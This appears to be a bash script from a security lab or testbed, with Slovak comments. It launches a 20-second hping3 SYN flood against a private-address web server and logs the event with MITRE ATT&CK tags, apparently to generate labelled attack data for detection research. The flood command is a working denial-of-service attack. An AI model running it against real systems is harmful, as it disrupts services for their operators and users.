#!/usr/bin/env bash
# Scenar 2: DoS - SYN flood na web server (limitovane na 20s, aby sme
# nepretazili hostitelsky stroj)
set -e
source /scripts/attacks/lib.sh

SCENARIO="dos_synflood"
log_event "$SCENARIO" "start" "dos" "172.28.0.10" "hping3" "TA0040/T1498 (T1499.001)"

timeout 20 hping3 -S -p 80 --flood 172.28.0.10 || true

log_event "$SCENARIO" "end"
